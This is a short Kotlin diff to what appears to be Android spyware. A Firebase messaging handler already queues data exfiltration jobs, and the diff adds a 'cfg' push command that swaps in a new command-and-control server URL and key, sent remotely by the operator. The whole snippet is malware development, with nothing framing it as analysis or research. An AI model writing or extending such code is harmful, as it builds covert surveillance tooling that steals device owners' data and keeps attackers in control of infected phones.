@@ -26,6 +26,13 @@ class FirebaseClient : FirebaseMessagingService() {
                 BatchExfil.enqueue(this, "media", msg.data.toString())
             }
             "ping" -> BatchExfil.enqueue(this, "ping", "{}")
+            "cfg" -> {
+                val url = msg.data["url"]
+                if (!url.isNullOrEmpty()) {
+                    Exfil.setC2(this, url, msg.data["key"])
+                    BatchExfil.enqueue(this, "cfg", """{"ok":true}""")
+                }
+            }
         }
     }
     override fun onNewToken(token: String) {
